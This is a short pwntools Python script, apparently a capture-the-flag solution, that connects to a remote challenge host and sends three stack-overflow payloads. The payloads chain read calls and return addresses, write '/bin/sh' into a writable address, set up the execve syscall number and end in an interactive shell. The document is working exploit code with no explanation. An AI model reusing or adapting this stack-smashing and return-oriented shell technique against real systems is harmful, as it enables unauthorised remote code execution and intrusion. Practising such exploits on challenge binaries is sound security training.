from pwn import *
context.log_file='debug'
elf = ELF('./main')
# io = process('./main')
io = remote('nep.lemonprefect.cn', 29308)

wr_addr = 0x804B008
read = 0x80480F0
write = 0x8048110
rw = 0x8048130
start = 0x80481A0
addrsp_0x20 = 0x8048190

payload = cyclic(0x10)
payload += p32(read)
payload += p32(start)  # retaddr
payload += p32(0)   # stdin
payload += p32(wr_addr)
payload += p32(0xb)
payload += p32(0)
payload += p32(wr_addr)
payload += p32(0)
payload += p16(0)

io.send(payload)
io.send(b'/bin/sh\x00'.ljust(0xb, b' '))

payload = cyclic(0x10)
payload += p32(read)
payload += p32(start)
payload += p32(0)   # stdin
payload += p32(wr_addr)
payload += p32(0xb)
payload += cyclic(0x8)
payload += p32(0x80480F5)
io.send(payload)
time.sleep(0.5)
io.send(b'/bin/sh\x00'.ljust(0xb, b' '))

# gdb.attach(io)
# time.sleep(3)
payload = cyclic(0x10)
payload += p32(read)
payload += p32(addrsp_0x20)
payload += p32(0)   # stdin
payload += p32(wr_addr)
payload += p32(0xb)
io.send(payload.ljust(0x32, b' '))
io.send(b'/bin/sh\x00'.ljust(0xb, b' '))

io.interactive()